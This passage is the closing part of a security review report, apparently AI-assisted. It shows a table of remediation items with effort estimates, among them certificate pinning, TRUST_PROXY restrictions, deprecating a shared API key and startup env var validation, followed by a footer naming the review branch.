| H-2 | Certificate pinning for non-production hosts | 4 hrs |
| H-7 | Document / restrict TRUST_PROXY configuration | 2 hrs |
| H-8 | Deprecate legacy shared API key | 4 hrs |
| M-1 | EncryptedSharedPreferences for attestation data | 2 hrs |
| M-7 | Idempotent Merkle root posting | 4 hrs |
| M-14 | Required env var validation at startup | 2 hrs |
| M-15 | Generic error messages in frontend | 2 hrs |
| All L | Low-severity issues | 1 day |

---

*Report generated by automated + human-reasoning security analysis.*
*Branch: `claude/code-security-review-uiVxN`*
